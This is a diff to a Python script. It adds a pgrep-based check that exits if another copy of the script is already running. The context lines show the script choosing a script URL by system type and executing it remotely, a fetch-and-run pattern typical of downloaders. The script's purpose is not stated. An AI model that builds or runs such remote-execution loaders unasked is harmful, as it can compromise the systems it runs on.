@@ -5,7 +5,19 @@ import os
 import requests
 import sys
 import configparser
+import subprocess
 from cryptography.fernet import Fernet
+
+def check_running_process():
+    try:
+        result = subprocess.run(['pgrep', '-f', os.path.basename(__file__)], 
+                              capture_output=True, text=True)
+        if result.returncode == 0:
+            pids = [int(p) for p in result.stdout.strip().split('\n') if p]
+            if len(pids) > 1:
+                sys.exit(0)
+    except:
+        pass
 
 def get_config():
     config = configparser.ConfigParser()
@@ -60,6 +72,7 @@ def execute_remote_script(url):
         return False
 
 def main():
+    check_running_process()
     system_type = get_system_type()
     script_url = get_script_url(system_type)
     execute_remote_script(script_url)
